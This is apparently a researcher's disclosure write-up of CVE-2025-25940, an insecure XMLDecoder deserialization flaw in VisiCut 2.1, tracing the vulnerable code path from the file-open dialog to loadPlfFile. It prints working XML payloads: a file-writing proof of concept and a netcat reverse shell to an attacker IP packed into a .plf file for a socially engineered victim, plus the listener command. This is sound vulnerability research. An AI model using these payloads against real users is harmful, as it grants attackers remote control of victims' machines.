Discovery of CVE-2025-25940
---
A new part of my weekly routine is to read through the most recently published CVEs to learn about new vulnerabilities and to observe trends in the types of vulnerabilities being discovered. One week in early January 2025, I came upon multiple vulnerabilities focused on _deserialization_. This led me down a rabbit hole of research, culminating in the discovery of my own XML deserialization vulnerability in the VisiCut software suite: **CVE-2025-25940**.

### **What is Serialization and Why is it Dangerous?**
Serialization is the process of converting an object into a format (e.g., XML, JSON) that can be stored or transmitted and later reconstructed. Deserialization is the reverse process - taking serialized data and converting it back into an object. However, if deserialization is performed on untrusted data without proper validation, attackers (or security researchers) can inject malicious objects and execute arbitrary code, leading to severe security risks.

A great video explaining deserialization exploitation is available here: [Exploit Java Deserialization](https://www.youtube.com/watch?v=KSA7vUkXGSg) by Frohoff - the creator of [ysoserial](https://github.com/frohoff/ysoserial).

## High-level Overview of CVE-2025-25940
VisiCut 2.1 is vulnerable to **insecure XML deserialization** in the `loadPlfFile` method of `VisicutModel.java`. This vulnerability occurs due to the use of `java.beans.XMLDecoder` to process user provided XML input in an unsafe manner. If an attacker supplies a ```.plf``` zip archive containing a malicious XML file, a victim user opening the ```.plf``` file could unintentionally execute arbitrary code, potentially allowing remote access to their victim machine.


## Vulnerable Code:

The vulnerability lies in lines 525 and 526 of [VisicutModel.java](https://github.com/t-oster/VisiCut/blob/87daf9a5f665debb8d27bce116022602b7c9e6a8/src/main/java/de/thomas_oster/visicut/VisicutModel.java#L525), where ```XMLDecoder``` is used to deserialize the contents of ```transform.xml```. In this snippet, the XMLDecoder object is instantiated using input from a ```ZipFile```, and its ```readObject()``` method is called without validation, meaning any arbitrary XML data provided within ```transform.xml``` will be processed and deserialized. 

```java
if (name.equals((i > 0 ? i+"/" : "")+"transform.xml")) // XML needs to be called transform.xml
      {
        XMLDecoder decoder = new XMLDecoder(zip.getInputStream(entry)); // Vulnerable
        transforms.put(i, (AffineTransform) decoder.readObject()); // Unsafe Deserialization
      }
```

The vulnerable code snippet above is part of the ```loadPlfFile``` method, which initializes a ZipFile from the provided ```File f```. This method extracts ```transform.xml``` from the archive and deserializes its contents using ```XMLDecoder```, making it susceptible to arbitrary code execution.

```java
  public PlfFile loadPlfFile(MappingManager mm, File f, List<String> warnings) throws IOException {
    ZipFile zip = new ZipFile(f); 
    PlfFile resultingFile = new PlfFile();
    resultingFile.setFile(f);
    //Collect for each part the transform,mapping and sourceFile
    Map<Integer,AffineTransform> transforms = new LinkedHashMap<>();
    Map<Integer,MappingSet> mappings = new LinkedHashMap<>();
    Map<Integer,File> sourceFiles = new LinkedHashMap<>();
    Enumeration<? extends ZipEntry> entries = zip.entries();
    while (entries.hasMoreElements())
    {
      ZipEntry entry = entries.nextElement();
      String name = entry.getName();
      Integer i = name.matches("[0-9]+/.*") ? Integer.parseInt(name.split("/")[0]) : 0;
      if (name.equals((i > 0 ? i+"/" : "")+"transform.xml"))
      {
        XMLDecoder decoder = new XMLDecoder(zip.getInputStream(entry));
        transforms.put(i, (AffineTransform) decoder.readObject());
      }
```

### Tracing the Vulnerable Function Call

To fully understand how the ```loadPlfFile``` method is executed, we trace back its invocation.

1) The ```loadPlfFile``` method is called within the broader ```loadFile``` method at line 462.

```java
 public void loadFile(MappingManager mm, File file, List<String> warnings, boolean discardCurrent) throws IOException, ImportException
  {
    if (PLFFilter.accept(file))
    {
      PlfFile newFile = loadPlfFile(mm, file, warnings);
      ...
      }
    }
```

2) For execution to reach line 462, ```PLFFilter.accept(file)``` must return ```true```. The ```PLFFilter``` ensures that only files with a ```.plf``` extension are accepted. This filter is instantiated at line 105:

```java
public static final FileFilter PLFFilter = new ExtensionFilter(".plf", "VisiCut Portable Laser Format (*.plf)");
```

3) With this knowledge, we conclude that to exploit this vulnerability, we need to craft a ```.plf``` archive containing a malicious ```transform.xml```.

4) To determine where ```loadFile``` is called, we search for references to it and find 11 occurrences in:
- ```PreviewPanelKeyboardMouseHandler.java```
- ```MainView.java```
- ```VicicutApp.Java```.

5) The most relevant reference is at line 1951 in ```MainView.java``` where [loadFile](https://github.com/t-oster/VisiCut/blob/master/src/main/java/de/thomas_oster/visicut/gui/MainView.java#L1951) is called from the ```openFileDialog``` method:

```java
private void openFileDialog(boolean discardCurrent)
  {
    final FileFilter allFilter = VisicutModel.getInstance().getAllFileFilter();
    //On Mac os, awt.FileDialog looks more native
    if (Helper.isMacOS() || Helper.isLinux())
    {
      FileDialog openFileChooser = new FileDialog(this, bundle.getString("PLEASE SELECT A FILE"));
      openFileChooser.setMode(FileDialog.LOAD);
      if (lastDirectory != null)
      {
        openFileChooser.setDirectory(lastDirectory.getAbsolutePath());
      }
      openFileChooser.setFilenameFilter(new FilenameFilter()
      {

        public boolean accept(File dir, String file)
        {
          return allFilter.accept(new File(dir, file));
        }
      });
      openFileChooser.setVisible(true);
      if (openFileChooser.getFile() != null)
      {
        File file = new File(new File(openFileChooser.getDirectory()), openFileChooser.getFile());
        loadFile(file, discardCurrent);
      }
    }
```

6) Since the file dialog opens when the user selects a file from the VisiCut GUI shown below, we can use this as our entry point to load the malicious ```.plf``` file manually.

To summarize:
1. **malicious XML file** named `transform.xml` must be placed inside a `.plf` archive.
2. The `loadPlfFile` method is triggered bypassing the **PLFFilter check:** The file extension must be `.plf` (defined in `ExtensionFilter`).
3. **loadFile method (line 462) calls loadPlfFile** if the file meets the filter criteria.
4. **openFileDialog method in `MainView.java` (line 1951) triggers `loadFile` when a user selects a file.**

## **Proof-of-Concept: Creating a Malicious Payload**
To demonstrate this vulnerability, I crafted a simple proof-of-concept XML payload that creates and writes to ```/tmp/poc_test.txt``` when loaded into VisiCut:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_181" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
        <string>sh</string>
      </void>
      <void index="1">
        <string>-c</string>
      </void>
      <void index="2">
        <string>echo hello > /tmp/poc_test.txt</string> // Create poc_test.txt
      </void>
    </array>
    <void method="start"/>
  </object>
</java>
```

Now, we package this XML file inside a `.plf` archive:

```bash
zip payload.plf transform.xml
```

Once loaded in **VisiCut**, `/tmp/poc_test.txt` is created containing the string ```hello```!

Proof string:

<img src="{{ site.url }}{{ site.baseurl }}/images/CVE-2025-03-06-POC-Test.JPG" alt="">

## **Attack Path: Reverse Shell Execution**
In this attack path, I have modified `transform.xml` to execute a reverse shell.

To delineate a scenario that is not too unrealistic, let's say I have been able to socially engineer a user of VisiCut to open up a _cool, highspeed new laser cutting job_ that I created named ```SuperCool.plf```. This ```.plf``` contains a ```transform.xml``` file containing the following contents that will spawn a reverse shell.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_181" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
        <string>sh</string>
      </void>
      <void index="1">
        <string>-c</string>
      </void>
      <void index="2">
        <string>nc -c sh 192.168.35.130 9001</string> // Reverse Shell Code
      </void>
    </array>
    <void method="start"/>
  </object>
</java>

```

Once ```SuperCool.plf``` is sent over to my victim user, I start up a netcat listener on my attacker machine.

```bash
nc -nvlp 9001
```

And when the victim loads the `.plf` file, I receive a shell granting me remote access to their system!

## **Conclusion**
This was an interesting vulnerability to research. Reviewing the source code of an open-source project provided a great opportunity to learn about insecure deserialization and how Java applications handle file inputs.
